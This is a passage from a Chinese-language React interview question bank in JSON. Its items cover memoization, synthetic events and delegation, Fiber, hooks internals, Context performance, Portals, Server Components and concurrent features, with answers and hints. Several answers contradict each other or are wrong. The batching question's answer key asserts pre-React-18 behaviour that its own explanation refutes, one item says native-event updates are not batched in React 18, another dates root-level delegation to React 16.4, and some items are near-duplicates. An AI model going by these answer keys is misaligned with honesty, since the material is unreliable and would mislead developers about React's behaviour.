的默认行为是父组件重新渲染时，所有子组件也重新渲染。\n\nReact.memo（防止不必要的子组件渲染）：\n- React.memo(Component) 对 props 做浅比较，如果 props 没变则跳过渲染\n- 适用于：纯展示组件、props 不频繁变化的组件\n- 原理：包裹后的组件只有 props 变化时才重新渲染（浅比较）\n- 注意：React.memo 只比较 props 的变化！如果组件内部使用了 context 或 state，仍会重新渲染\n\nuseMemo（缓存计算结果）：\n- const sorted = useMemo(() => expensiveSort(data), [data])\n- 只有依赖数组变化时才重新计算\n- 避免昂贵的计算在每次渲染时重复执行\n- 也用于保持引用稳定性（不传依赖时每次渲染都创建新数组/对象）\n\nuseCallback（缓存函数引用）：\n- const handleClick = useCallback(() => doSomething(id), [id])\n- 返回一个缓存的函数引用（不每次重新创建）\n- 配合 React.memo 使用时关键：如果父组件每次渲染都重新创建回调函数，\n  React.memo 检测到函数引用变化，子组件仍然会重新渲染\n\n使用场景：\n- React.memo + useCallback：子组件频繁收到来自父组件的回调，且子组件渲染开销大\n- useMemo：计算量大或需要保持引用稳定性的值\n- 不要过早优化：React.memo/useMemo 自身的比较也有开销\n\n分析不必要的渲染：\n- React DevTools Profiler：记录组件渲染时间、原因（why did this render）\n- Why Did You Render 库：在开发环境检测不必要的重新渲染\n- Chrome Performance 面板：查看火焰图中的组件渲染\n\nReact 18 的渲染优化：\n- Automatic Batching：多个 setState 合并为一次渲染\n- useTransition：将低优先级更新标记为过渡，不阻塞 UI\n- useDeferredValue：延迟更新某个值（如搜索建议中旧值继续显示，新值在后台计算）\n- Suspense + Streaming SSR：服务端逐步发送 HTML，客户端逐步渲染\n\n扩展延伸：不可变数据（Immer）——简化不可变更新，减少不必要的渲染。状态提升 vs 状态隔离——将频繁变化的状态下沉到子组件，减少影响范围。代码分割（React.lazy + Suspense）——按需加载组件，减少初始加载时间。","hints":["React.memo（浅比较 props 防子组件重渲染）+ useMemo（缓存计算）+ useCallback（缓存函数引用，配合 React.memo）","分析工具：React DevTools Profiler + Why Did You Render"],"tags":["React","优化","渲染","memo"],"id":3488},{"category":"react","difficulty":"easy","type":"short_answer","title":"React 合成事件","content":"请介绍 React 的合成事件（SyntheticEvent）系统。为什么 React 不直接使用浏览器原生事件？事件委托（Event Delegation）在 React 中是如何实现的？","answer":"答案：React 合成事件是对浏览器原生事件的跨浏览器封装，提供统一接口和性能优化。\n\n合成事件的特点：\n- 跨浏览器一致性：不同浏览器的事件行为差异被抹平（如 e.stopPropagation() 在所有浏览器中行为一致）\n- 事件池（Event Pooling，React 17 前）：合成事件对象被重用，异步访问需要 e.persist()\n  React 17+ 不再使用事件池（每次创建新事件对象，更符合直觉）\n- 接口与原生事件类似：e.preventDefault()、e.stopPropagation()、e.target\n- 类型安全：TypeScript 中通过 React.MouseEvent、React.ChangeEvent 等获得类型提示\n\n事件委托（Event Delegation）：\n- React 不将事件直接绑定到 DOM 元素上\n- React 17 之前：所有事件委托到 document 上\n- React 17+：所有事件委托到 root 容器上（因为微前端场景中 document 可能被多个 React 实例共享）\n- 优点：\n  - 减少内存占用（不需要为每个元素绑定事件监听器）\n  - 动态添加的元素自动获得事件处理（不需要重新绑定）\n  - 方便批量处理\n\n为什么不用原生事件：\n- 浏览器兼容性：不同浏览器的事件实现有差异（如停止传播的方式、事件属性）\n- 统一管理：React 可以在事件处理中统一做状态更新批处理\n- 性能：事件委托到根节点，减少 DOM 事件监听器的数量\n- Fiber 优先级：React 可以给不同类型的事件分配不同的优先级（如用户输入高于动画）\n\n事件处理中的 setState：\n- React 18 中，事件处理中的 setState 自动批处理\n- 多个 setState 合并为一次渲染\n- 原生事件（如 addEventListener）中的 setState 不会批处理\n\n扩展延伸：React 事件和原生事件的混用——不要在同一个 DOM 元素上混用 React 合成事件和原生事件（执行顺序不可预测）。Passive Event Listeners——React 未默认启用 passive 属性（对滚动性能有影响）。Pointer Events——React 支持 Pointer Events 处理触点、鼠标和触控笔的统一事件（onPointerDown/onPointerMove/onPointerUp）。","hints":["合成事件 = 跨浏览器一致的事件接口 + 事件委托到 root 节点（React 17+）","事件委托：所有事件绑定到 root，减少监听器数量 + 自动覆盖动态元素"],"tags":["React","合成事件","事件委托","SyntheticEvent"],"id":3489},{"category":"react","difficulty":"easy","type":"short_answer","title":"React Fiber 架构","content":"请介绍 React Fiber 架构的设计目标及其如何实现可中断渲染。","answer":"答案：React Fiber 是 React 16 引入的新协调引擎，实现了可中断的异步渲染。\n\n设计目标：\n1. 将渲染拆分为可中断的小单元\n2. 为不同类型的更新分配优先级\n3. 支持并发模式（Concurrent Mode）\n\nFiber 节点：\n- 每个组件对应一个 Fiber 节点\n- Fiber 节点构成链表树（child、sibling、return）\n- 包含组件的状态、props、DOM 信息\n\n双缓冲（Double Buffering）：\n- current Fiber 树：当前屏幕上显示的内容\n- workInProgress Fiber 树：正在构建的新视图\n- 提交阶段（Commit）将 workInProgress 切换为 current\n\n工作流程：\n\n1. 协调阶段（Reconciliation Phase / Render Phase）：\n   - 可中断\n   - 遍历 Fiber 树，收集变更（增删改 DOM）\n   - 构建 workInProgress 树\n   - 调用 render 函数，返回新的子元素\n\n2. 提交阶段（Commit Phase）：\n   - 不可中断（同步执行）\n   - 将变更应用到 DOM\n   - 执行生命周期方法（componentDidMount/Update）\n   - 切换 Fiber 树\n\n优先级调度（Scheduler）：\n- Immediate：同步执行（最高优先级）\n- UserBlocking：用户交互（点击、输入）\n- Normal：普通更新\n- Low：低优先级（数据预取）\n- Idle：空闲时执行\n\n时间分片（Time Slicing）：\n- 每帧（16ms）预留 5ms 给 React\n- 5ms 到期后暂停渲染，让出主线程处理用户输入/动画\n- 浏览器空闲时继续渲染\n\nFiber 链表遍历：\n- 顶节点开始 → child → sibling → 回到父节点（return）\n- 深度优先遍历\n- 使用链表结构实现暂停和恢复（记录当前遍历位置）\n\n扩展延伸：React 18 的并发特性（startTransition、useDeferredValue、Suspense）都依赖 Fiber 架构。\"并发\"的本质是：更高优先级的更新可以中断正在进行的低优先级渲染。","hints":["Fiber 架构的目标：可中断渲染 + 优先级调度 + 并发模式","双 Fiber 树：current（当前屏幕） + workInProgress（构建中），Commit 后切换","两个阶段：Render Phase（可中断，收集变更） + Commit Phase（不可中断，应用到 DOM）"],"tags":["React","Fiber","并发","渲染"],"id":3490},{"category":"react","difficulty":"easy","type":"short_answer","title":"React 状态管理策略对比","content":"请对比 React 的几种状态管理方案：Context、Redux、Zustand 和 Jotai。","answer":"答案：React 状态管理方案从内置到第三方，各有适用场景。\n\nReact Context：\n\n原理：\n- React 内置的跨组件数据传递机制\n- Provider 提供值，useContext 消费\n- 值变化时所有消费该 Context 的组件重新渲染\n\n优点：\n- 无需额外依赖\n- 使用简单\n\n缺点：\n- 不适合高频更新（所有消费者都会被通知）\n- 没有选择性子订阅（不能只监听部分值）\n- 无法避免中间组件的无关重渲染\n\n适用：主题、语言、用户认证信息等低频更新数据\n\nRedux / Redux Toolkit：\n\n原理：\n- 单向数据流：Action → Reducer → Store\n- 单一 Store，纯函数更新\n- 中间件处理副作用（Redux Thunk/Saga）\n\n优点：\n- 状态变化可预测、可追踪（DevTools）\n- 生态丰富\n- 适合复杂状态逻辑\n\n缺点：\n- 样板代码多（即使有了 Toolkit）\n- 概念较多（Action、Reducer、Middleware）\n- 学习曲线\n\n适用：复杂的大型应用、需要时间旅行调试的场景\n\nZustand：\n\n原理：\n- 基于 Flux 思想的轻量状态管理\n- create 创建 store，useStore 消费\n- 支持选择性子订阅\n\n优点：\n- 极简 API，无样板代码\n- 不依赖 Provider 包裹\n- 选择性子订阅避免不必要的重渲染\n\n适用：中小型应用、优先开发体验\n\nJotai：\n\n原理：\n- 原子状态模型（Atom-based）\n- 每个原子独立管理，组件按需订阅\n- 支持派生原子（atom 依赖另一个 atom）\n\n优点：\n- 细粒度订阅（只更新使用该原子的组件）\n- 组合灵活\n- 与 React 模型更自然\n\n适用：需要细粒度状态控制的场景\n\n选择建议：\n- 简单跨组件传值 → Context\n- 复杂应用需要 DevTools → Redux Toolkit\n- 追求开发体验 → Zustand\n- 细粒度性能优化 → Jotai\n\n扩展延伸：React 19 的 use() hook 可以直接读取 Context（use(Context)），取消了 useContext 的限制条件。Server Components 的出现改变了状态管理的格局——数据源从客户端状态转向服务端数据请求。","hints":["Context：内置、简单、不适合高频更新（主题/语言/用户信息）","Redux：单一 Store、可预测、生态丰富（复杂大型应用）","Zustand：极简 API、选型订阅；Jotai：原子模型、细粒度控制"],"tags":["React","状态管理","Redux","Zustand"],"id":3491},{"category":"react","difficulty":"medium","type":"short_answer","title":"React hooks 的规则与实现原理","content":"请介绍 React hooks 的使用规则及其链式调用实现的底层原理。","answer":"答案：Hooks 是 React 16.8 引入的函数组件状态和副作用机制。\n\n使用规则：\n\n1. 只在函数组件或自定义 Hook 中调用 Hook\n2. 只在顶层调用 Hook（不能在条件、循环、嵌套函数中调用）\n3. 命名以 use 开头（自定义 Hook 的约定）\n\n为什么不能条件调用：\n- Hook 的调用顺序是 React 关联状态和组件的关键\n- 每次渲染，Hook 按相同的顺序执行\n- 若条件跳过某个 Hook，顺序错乱导致状态错位\n\n实现原理（基于 Fiber）：\n\n1. 链表结构：\n   - 每个 Fiber 节点维护一个 memorizedState 链表\n   - 链表的每个节点对应一个 Hook\n   - 节点包含：state、queue（更新队列）、next（指向下一个 Hook）\n\n2. 挂载阶段（mount）：\n   - mountState（useState）：创建 Hook 节点，初始化 state\n   - mountEffect（useEffect）：创建 Hook 节点，保存 effect 回调\n   - mountRef（useRef）：创建 Hook 节点，初始化 ref\n\n3. 更新阶段（update）：\n   - 按顺序遍历 Hook 链表\n   - updateState：取当前 Hook 节点的 state\n   - updateEffect：比对依赖数组，决定是否重新执行\n\n关键 Hook 的实现：\n\nuseState：\n- 内部基于 useReducer\n- dispatch 将更新加入 queue\n- 调度重新渲染\n\nuseEffect：\n- 存储 effect 对象（create、deps、destroy）\n- 提交阶段执行上一个 effect 的 destroy\n- 提交阶段后执行当前 effect 的 create\n\nuseRef：\n- 返回 { current: initialValue }\n- 同一个对象（复用 Fiber 节点）\n\nuseMemo/useCallback：\n- 存储依赖数组和计算结果\n- 比对依赖决定是否重新计算\n\n扩展延伸：React 19 的 use() Hook 是一个新原语——可以直接在条件/循环中使用。它还支持读取 Promise（替代 useEffect + fetch 模式）和 Context（替代 useContext）。","hints":["规则：只在函数组件顶层调用（不在条件/循环中），保证每次渲染的调用顺序一致","实现：Fiber 的 memorizedState 链表，每次渲染按顺序遍历链表取状态","核心 Hook 原理：useState（基于 useReducer + dispatch 调度）、useEffect（create/destroy 在 Commit 前后执行）"],"tags":["React","Hooks","Fiber","useState"],"id":3492},{"category":"react","difficulty":"easy","type":"short_answer","title":"React 合成事件与事件委托","content":"请介绍 React 的合成事件（SyntheticEvent）系统及其事件委托机制。","answer":"答案：React 合成事件是跨浏览器兼容的封装事件系统。\n\n合成事件（SyntheticEvent）：\n\n是什么：\n- React 对原生 DOM 事件的跨浏览器封装\n- 统一的接口（符合 W3C 规范）\n- 自动处理浏览器差异（事件属性、默认行为阻止方式）\n\n特点：\n- 事件池机制：SyntheticEvent 对象会被重用\n- 事件回调执行后，合成事件对象的属性被清空\n- 异步访问事件需要 event.persist()（React 17 后淘汰了事件池）\n\n事件委托：\n\nReact 16 的做法：\n- 所有事件绑定到 document 上\n- React 16.4 后绑定到 root 的 DOM 容器（#root）\n\nReact 17+ 的做法：\n- 绑定到 React 挂载的根节点（rootNode）\n- 而非 document\n\n好处：\n- 减少事件监听器数量（无论多少子组件，只绑定一个根监听器）\n- 内存优化\n- 动态添加/删除元素不需要重新绑定事件\n\n为什么 React 17 改为绑定到 root：\n- 多个 React 版本共存时（嵌套微前端），document 监听器互相干扰\n- root 监听器只会收到该 React 树内部冒泡的事件\n- 更安全、更隔离\n\n事件处理流程：\n1. 原生事件触发（浏览器创建原生 Event）\n2. 事件冒泡到 root 节点\n3. React 的 root 监听器收听到事件\n4. React 创建 SyntheticEvent 对象\n5. 遍历 Fiber 树，收集事件处理的回调（从触发节点到 root）\n6. 按顺序执行回调（捕获阶段从上到下，冒泡阶段从下到上）\n7. SyntheticEvent 对象被回收\n\n扩展延伸：React 18 自动批处理（Automatic Batching）与事件系统协同——在合成事件中的多次 setState 自动批处理为一组更新。在 setTimeout、Promise、原生事件中也会自动批处理（不再需要 unstable_batchedUpdates）。","hints":["SyntheticEvent：跨浏览器封装，统一接口，自动处理浏览器差异","事件委托：React 17+ 绑定到 root 节点（非 document），单监听器代理所有事件","React 18 自动批处理：合成事件中多次 setState 自动合并为一次更新"],"tags":["React","合成事件","事件委托","SyntheticEvent"],"id":3493},{"category":"react","difficulty":"hard","type":"short_answer","title":"React 的 Refs 与 forwardRef","content":"请介绍 React 中 Ref 的多种使用方式、forwardRef 的作用以及 useImperativeHandle 的用途。","answer":"答案：Ref（Reference）提供了一种直接访问 DOM 节点或 React 组件实例的方式。\n\nRef 的使用方式：\n\n1. useRef：\n   - 函数组件的 ref 创建方式\n   - 返回 { current: initialValue } 的可变对象\n   - current 变化不触发重新渲染\n   - 用途：DOM 引用、保存可变值（闭包陷阱解决）\n\n2. createRef：\n   - 类组件的 ref 创建方式\n   - 每次渲染创建新对象\n   - 不推荐在函数组件中使用\n\n3. callback ref：\n   - 更精细的控制\n   - 组件挂载时调用回调（参数为 DOM 元素）\n   - 卸载时调用回调（参数为 null）\n   - 可封装为 useEffect 的依赖\n\nforwardRef：\n\n为什么需要：\n- Ref 属性不是 prop，不会自动传递\n- 函数组件默认没有实例，不能直接接收 ref\n\n用法：\n```jsx\nconst Child = forwardRef((props, ref) => {\n  return <input ref={ref} />\n})\n// 父组件：<Child ref={inputRef} />\n```\n\nuseImperativeHandle：\n\n作用：\n- 自定义暴露给父组件的实例值\n- 限制父组件可以调用的方法\n- 不暴露整个 DOM 或组件实例\n\n```jsx\nconst Child = forwardRef((props, ref) => {\n  useImperativeHandle(ref, () => ({\n    focus: () => inputRef.current.focus(),\n    validate: () => { /* 验证逻辑 */ }\n  }))\n  return <input ref={inputRef} />\n})\n```\n\nRef 的典型应用场景：\n1. 管理焦点（输入框自动聚焦）\n2. 触发动画\n3. 集成第三方 DOM 库（D3、Chart.js）\n4. 视频/音频播放控制\n5. 测量 DOM 尺寸（getBoundingClientRect）\n\nReact 19 的 ref 改进：\n- ref 可以作为 prop 直接传递（不再需要 forwardRef）\n- 函数组件可以直接接收 ref prop\n- \\<input ref={ref} /> 在任何组件中都可以工作（如果组件内部透传了 ref）\n\n扩展延伸：ref 转发在组件库开发中非常常见——高定组件需要将 ref 传递到实际的 DOM 元素。Headless UI 库（如 Radix UI）广泛使用 forwardRef + useImperativeHandle 来提供受控 API。","hints":["useRef：函数组件创建 ref，返回 { current } 可变对象（不触发重渲染）","forwardRef：将 ref 透传给子组件（函数组件不自带 ref 接收能力）","useImperativeHandle：限制暴露给父组件的方法（安全封装）"],"tags":["React","ref","forwardRef","useImperativeHandle"],"id":3494},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 合成事件与原生事件","content":"请解释 React 合成事件（SyntheticEvent）的工作原理以及它与原生 DOM 事件的区别。","answer":"答案：合成事件是 React 对浏览器原生事件对象的跨浏览器封装，提供一致的接口和性能优化\n\n解析：React 16 在 document 上注册事件监听（事件委托），React 17+ 改为在 React 根容器上注册。所有事件都通过事件冒泡到达根容器后统一处理——这减少了大量事件监听器的内存占用。合成事件对象（SyntheticEvent）实现了 W3C 事件规范，抹平了不同浏览器的事件差异（如 stopPropagation、preventDefault 各浏览器实现不同）。关键特性：1）合成事件池（Event Pooling，React 16）——事件回调完成后，合成事件对象的属性被置 null 并被回收，异步访问需调用 event.persist()（React 17 后废弃此优化）。2）原生事件在冒泡阶段触发合成事件（stopPropagation 行为符合 React 组件树而不是 DOM 树 3）React 17 不再需要事件委托到 document，避免多个 React 应用同页面冲突。\n\n扩展延伸：在 React 组件中混用原生事件监听（ref.addEventListener）和合成事件需注意执行顺序：原生事件的捕获/冒泡先执行，然后在根容器上触发合成事件处理。stopPropagation() 在合成事件中只能阻止同层级的合成事件不能阻止原生事件。Passive 事件监听（{ passive: true }）用于优化滚动性能，touchstart/touchmove 默认 passive: true 不能被动调用 preventDefault。React 18 的并发模式中，合成事件在并发渲染下可能被优先处理（事件触发更高优先级的更新）。React 19 正式版中，合成事件系统进一步优化了内存使用并与并发渲染深度集成。","hints":["React 17 为什么把事件委托从 document 改到根容器","合成事件池（Event Pooling）在 React 17 中为什么被移除"],"tags":["React","事件","合成事件"],"id":3495},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Error Boundary 原理","content":"请解释 React Error Boundary 的实现原理和使用限制。","answer":"答案：Error Boundary 是捕获子组件树 JavaScript 错误并显示降级 UI 的 React 组件\n\n解析：类组件实现 componentDidCatch(error, errorInfo) 或 static getDerivedStateFromError(error) 即可成为 Error Boundary。getDerivedStateFromError 用于渲染降级 UI，componentDidCatch 用于记录错误日志。Error Boundary 不能捕获的错误：1）事件处理中的错误（try-catch 自行处理）2）异步代码（setTimeout、requestAnimationFrame、Promise）中的错误 3）服务端渲染中的错误 4）Error Boundary 自身抛出的错误（需嵌套另一个 Error Boundary）。在 React 生产模式下，未捕获的错误会触发全局的 React error event。\n\n扩展延伸：Error Boundary 的捕获范围：以虚拟 DOM 树为边界，不是 React 组件层级中的实际边界。边界只在其子树内的渲染、生命周期和构造方法中生效。多个 Error Boundary 可以嵌套使用——子边界未处理时错误冒泡到父边界。React 错误恢复机制——React 18 并发模式中，Error Boundary 在渲染阶段发生的错误可以在后续重试渲染。对于函数组件，React 没有提供 Error Boundary 的 hook 形式（始终不支持函数组件直接作为 Error Boundary），但可以用高阶组件（withErrorBoundary）封装。React 18+ 的 suspense + error boundary 组合用于数据请求错误场景：Suspense 处理 loading，Error Boundary 处理错误。React 19 不再有新错误边界 API，但 Error Recovery 方面做了改进（减少 catch 遗漏导致的白屏问题）。","hints":["为什么函数组件不能直接作为 Error Boundary","Error Boundary 为什么不能捕获异步代码错误"],"tags":["React","错误处理","Error Boundary"],"id":3496},{"category":"react","difficulty":"hard","type":"short_answer","title":"React Context 性能优化","content":"请分析 React Context 在重渲染时的性能问题及优化方案。","answer":"答案：Context 值变化会导致所有消费该 Context 的组件及其子组件重新渲染\n\n解析：当 Context Provider 的 value 引用变化时，所有使用了 useContext(Context) 的 consumer 组件会重新渲染（即使它们只关心 value 中的部分字段）。因为 Context 没有内置选择性的订阅机制，context value 的任何变化都会触发所有 consumer 的更新。这会导致 consumer 组件树中的子组件无关联渲染（即使用 React.memo 包裹的子组件也会因为父组件更新而重新渲染——因为 consumer 组件对子组件的 render 返回新 JSX 破坏了 memo 的引用优化）。\n\n扩展延伸：优化方案：1）将频繁变化的值和不常变化的值分到不同的 Context（如 ThemeContext + UserSettingsContext 分离）2）使用 useMemo 包裹 value 对象避免不必要的引用变化 3）在 consumer 中配合 useMemo/React.memo 局部优化 4）使用状态管理库替代 Context（Zustand/Jotai 基于订阅模式只更新使用该 state 的组件 5）使用 use-context-selector（React 官方 RFC 中 proposed 的 API，通过 proxy 实现选择性订阅）。Recompose / Reusable Context Selector 实践中常用拆分多个 Context 的策略。最推荐的做法：如果 conumer 数量多且价值变化频繁，考虑使用 Zustand（基于 immmer + selector）或 Jotai（原子化 state）替代 Context。Zustand 的 selector useStore(store, s => s.count) 只在 count 变化时重渲染。","hints":["Context value 中的部分字段变化时为什么所有 consumer 都重渲染","拆分多个 Context 是怎么解决重渲染问题的"],"tags":["React","Context","性能"],"id":3497},{"category":"react","difficulty":"medium","type":"choice","title":"React 批处理更新","content":"在 React 18 中，以下哪个场景会触发多次渲染而非自动批处理？","options":["A) setTimeout 中的多个 setState","B) Promise 回调中的多个 setState","C) 原生 DOM 事件处理中的多个 setState","D) 以上所有场景在 React 18 中都自动批处理"],"answer":"答案：D) 只在调度器的同步事件循环中批量处理状态更新，在异步回调、Promise、setTimeout 中默认不批量，需要使用 unstable_batchedUpdates\n\n解析：React 18 之前，只在 React 自身的事件处理函数中进行批处理（如 onClick），而 setTimeout、Promise、原生事件中的多次 setState 不会批量。React 18 引入 createRoot 后，所有更新都自动批处理（automatic batching），包括 setTimeout 和 Promise。所以 D 选项描述的是 React 17 及之前的行为。React 18 不需要 unstable_batchedUpdates。","hints":["React 18 在 createRoot 模式下，所有场景（包括 setTimeout/Promise/原生事件）都会自动批处理"],"tags":["React","批处理","渲染"],"id":3498},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Portal 事件冒泡","content":"请解释 React Portal 的事件冒泡机制及其与 DOM 树的关系。","answer":"答案：Portal 中触发的事件会按照 React 组件树而非 DOM 树进行冒泡\n\n解析：ReactDOM.createPortal(children, domNode) 将 children 渲染到 DOM 树的不同位置（如 document.body），但事件冒泡仍遵循 React 组件树结构。这意味着 Portal 内部触发的合成事件会冒泡到组件树中 Portal 的父级组件，而不是按照 DOM 层级在 Portal 的 DOM 父元素上捕获。这一行为对于实现模态框、弹窗、悬浮层非常关键：模态框虽然渲染在 document.body 下，但事件仍能冒泡到其逻辑父组件。合成事件委托（在 React 根容器上）自然会捕获到 Portal 内冒泡的事件。\n\n扩展延伸：React 16 实现 Portal 时，事件在虚拟 DOM 树沿 fiber 节点逐层冒泡（从 Portal 内部的 fiber 节点父级逐级向上），这就是保持原有冒泡序列的原因。如果用原生 DOM API 在 Portal 容器手动添加事件监听，监听的是 Portal 渲染到的实际 DOM 位置，而不是组件树中的位置（需要区分合成事件和原生事件）。Portal 的典型问题：在 Modal 中使用 onMouseLeave 可能不会如预期触发——因为鼠标移动到 Modal 外部时在 DOM 层级是从 Modal 的子元素移出 body，但 React 的冒泡并不按 DOM 层级。React 17 的事件委托改到根容器上，Portal 的冒泡机制不变。React 19 中 Portal 的行为保持兼容。","hints":["Portal 渲染到 document.body 但事件怎么冒泡到父组件","在 Portal 内用原生事件监听需要注意什么"],"tags":["React","Portal","事件"],"id":3499},{"category":"react","difficulty":"medium","type":"short_answer","title":"useEffect 清理时机与 Strict Mode 二次调用","content":"在 React 中 useEffect 的清理函数（cleanup）是在什么时候执行的？React Strict Mode 下为什么 useEffect 会被调用两次？这对 Effect 的设计有什么影响？","answer":"答案：清理函数在下一次 Effect 执行前或组件卸载时执行。严格来说流程是——组件挂载 → Effect 执行 → 依赖变化或卸载 → 上次的清理函数执行 → 新 Effect 执行（如果依赖变化）。在 Strict Mode 下，React 在开发环境会故意挂载→卸载→重新挂载组件，所以 Effect 执行 → 清理 → 再次执行。\n\n解析：**清理时机详解**——假设组件第一次渲染，useEffect 回调执行并返回 cleanup。当依赖变化触发重渲染时：先执行上一次的 cleanup（清理旧副作用）→ 执行新的 Effect 回调。组件卸载时：执行最后一次 cleanup。**Strict Mode 二次调用**——严格模式下 React 会在 mount 后立即 unmount 再 remount，以检测 Effect 是否未正确清理（如缺少 cleanup 导致内存泄漏）。这不是 Bug，而是开发环境的「压力测试」。如果 Effect 在二次挂载时出现不一致行为（如重复注册事件、重复请求），说明清理逻辑有遗漏。\n\n扩展延伸：Strict Mode 只影响开发环境，生产环境中 Effect 只执行一次。useEffect + cleanup 的经典模式——订阅外部事件（addEventListener → removeEventListener）、定时器（setInterval → clearInterval）、WebSocket 连接（connect → disconnect）。useEffect 的竞态问题——如果 Effect 发起异步请求，依赖变化后旧请求仍在进行中，需用 cleanup 标记过期（如设置 didCancel flag）避免 setState 在已卸载组件上执行。","hints":["Strict Mode 为什么要故意挂载两次来测试清理函数","如果 Effect 中有异步请求，如何防止竞态条件"],"tags":["React","useEffect","Hooks","Strict Mode"],"id":3500},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Server Components 序列化与客户端边界","content":"React Server Components (RSC) 中服务器组件是如何序列化并传输到客户端的？客户端边界（Client Boundary, 'use client'）是如何划分的？什么数据可以跨边界传递，什么不可以？","answer":"答案：RSC 使用一种名为 RSC Payload 的特殊格式（基于 JSON + React 元素树）序列化服务器组件渲染结果。'use client' 标记的文件定义了客户端边界——边界内的组件在客户端运行，边界外的组件只在服务端运行。跨边界只能传递序列化后的 props（必须可 JSON 序列化或支持特殊类型如 Date、Map、ReactNode），函数和类实例不能传递。\n\n解析：序列化机制——服务器组件执行后生成 React 元素树（不是 HTML），RSC 协议将其编码为流式 JSON 格式。每个元素包含类型、props 和客户端组件引用信息。客户端收到 RSC Payload 后重建 React 元素树，与已有的客户端组件树合并。客户端边界——当服务器组件树中遇到 'use client' 组件的引用时，RSC Payload 只包含该组件的「引用名」和其序列化后的 props，实际的组件代码已在客户端 bundle 中。边界的关键是引用不可传递——你不能把服务器端组件作为 prop 传给客户端组件。\n\n扩展延伸：RSC 的优势——直接在后端访问数据库/文件系统，不暴露敏感逻辑，自动代码分割（只有客户端组件被打包）。RSC 与 SSR 的区别和协同——SSR 将组件渲染为 HTML 字符串（用于首屏），RSC 返回的是组件树描述（用于交互）。RSC 可以与 SSR 并存：SSR 做首屏，RSC Payload 用于后续导航。RSC 的限制——不能使用 hooks、不能依赖浏览器 API、不能有事件处理。","hints":["RSC Payload 和 SSR 的 HTML 有什么本质区别","为什么函数不能作为 prop 传递给 'use client' 组件"],"tags":["React","Server Components","RSC","架构"],"id":3501},{"category":"react","difficulty":"hard","type":"short_answer","title":"useTransition 与 useDeferredValue 并发差异","content":"React 18+ 的并发特性中 useTransition 和 useDeferredValue 都可以用于标记非紧急更新（Non-urgent Updates），它们的使用方式和底层机制有什么不同？分别适用于什么场景？","answer":"答案：useTransition 用于将一段状态更新标记为 Transition（低优先级），返回 [isPending, startTransition]。useDeferredValue 用于将一个值标记为延迟更新，返回该值的延迟版本。useTransition 包裹的是状态更新逻辑，useDeferredValue 包裹的是从状态派生的值。\n\n解析：使用方式差异——useTransition：const [isPending, startTransition] = useTransition(); startTransition(() => setQuery(newValue))。适合在事件处理中区分紧急/非紧急更新。useDeferredValue：const deferredQuery = useDeferredValue(query)。当 query 频繁变化时，组件先用 deferredQuery（旧值）渲染，React 在后台用新值重新渲染。底层机制——两者都利用了 React 的并发调度器（Scheduler）。useTransition 通过降低内部状态的优先级标记，触发紧急更新先渲染，Transition 更新可被中断。useDeferredValue 本质是「值降级」——如果新值已经准备好，React 在空闲时用新值渲染；渲染过程中被用户交互中断则保持旧值。\n\n扩展延伸：什么时候用哪个——1）如果控制权在你手里（你拥有 setState），用 useTransition。输入框 onChange → setInput 是紧急更新，基于 input 发起搜索是 Transition 更新。2）如果你不能控制生产者（如 prop 来自父组件或第三方库），用 useDeferredValue。3）useDeferredValue 在渲染期间自动工作，无需手动包裹 setState。结合 Suspense——useTransition 支持挂起（Suspense），在 Transition 内触发的 Suspense fallback 不会替换已显示的内容，而是保持当前 UI 直到新内容就绪。","hints":["输入框中的 onChange 更新——应该用 useTransition 还是 useDeferredValue","useDeferredValue 为什么不需要手动标记更新优先级"],"tags":["React","并发","useTransition","useDeferredValue"],"id":3502},{"category":"react","difficulty":"medium","type":"short_answer","title":"React.memo 引用相等性与 useCallback 联动","content":"React.memo 是如何判断是否需要跳过重渲染的？为什么 React.memo 通常需要和 useCallback/useMemo 配合使用？如果没有正确使用引用相等性，React.memo 可能失效的原因是什么？","answer":"答案：React.memo 通过浅比较（Shallow Compare）props 来决定是否跳过子组件重渲染。如果 props 的每个值引用都相同（===），则跳过渲染使用缓存结果。但内联创建的对象/函数每次渲染都是新引用，导致浅比较失败，memo 失效——因此需要 useCallback/useMemo 保持引用稳定。\n\n解析：React.memo(Component, areEqual?)——默认使用 Object.is 做浅比较，逐个比较 props 的 key：prevProps.key === nextProps.key。内联对象/数组/函数每次创建新的引用，所以浅比较永远返回 false，memo 退化为无优化。解决方案——回调函数用 useCallback 包裹（const handleClick = useCallback(() => {...}, [deps])）、派生对象用 useMemo 包裹（const config = useMemo(() => ({...}), [deps])）。\n\n扩展延伸：areEqual 自定义比较函数——传递第二个参数实现深度比较（如 React.memo(Comp, (prev, next) => _.isEqual(prev, next))），但不推荐因为每次都要深比较，反而可能拖慢性能。memo 的成本——memo 本身也有比较开销，如果子组件渲染很快（基本无运算），memo 的浅比较反而浪费。规则：只有当子组件渲染成本高（大数据列表、图表、复杂子组件树）时才用 memo。React Compiler（原 React Forget）将自动完成记忆化，手动 useMemo/useCallback/memo 将不再是必备优化手段。","hints":["为什么内联箭头函数会让 React.memo 失效","React Compiler 如何自动完成记忆化优化"],"tags":["React","性能","memo","useCallback"],"id":3503},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Portal 事件冒泡穿越 Portal 边界的机制","content":"React Portal 可以将子节点渲染到 DOM 树中父组件之外的节点（如 document.body）。但 Portal 内触发的事件为什么能冒泡到 Portal 父组件的祖先节点？React 是如何实现这种「虚拟冒泡」的？","answer":"答案：React Portal 的「事件冒泡穿越 Portal 边界」是 React 合成事件系统实现的，不是 DOM 原生行为。Portal 内触发的事件在 React 的合成事件树中沿着 React 组件树（而非 DOM 树）向上冒泡，所以能触发 Portal 父组件上的事件处理。\n\n解析：实现机制——React 的事件委托机制将事件全部绑定到 root 容器（React 17 前是 document，React 17+ 是 React root DOM 节点）。事件触发时，React 不依赖 DOM 树的事件冒泡路径，而是根据 Fiber 树的父子关系构建事件传播路径。Portal 组件渲染到不同 DOM 位置，但在 Fiber 树中仍然是 Portal 父组件的子节点，所以 React 合成事件系统中的冒泡路径遵循 Fiber 树结构，而非 DOM 树。\n\n扩展延伸：一个 Portal 弹出层（Modal）放在 document.body 中，内部点击按钮触发 onClick。在 DOM 树上，body → button，冒泡目标是 body。但在 React 中，事件处理系统会从 button 对应的 Fiber 节点开始向上遍历 Fiber 树，经过 Portal 父组件、祖父组件等。这意味着——父组件可以通过事件冒泡捕获 Portal 内的点击，实现点击外部关闭弹窗（Outside Click）。需要注意的是——React 合成事件能穿透 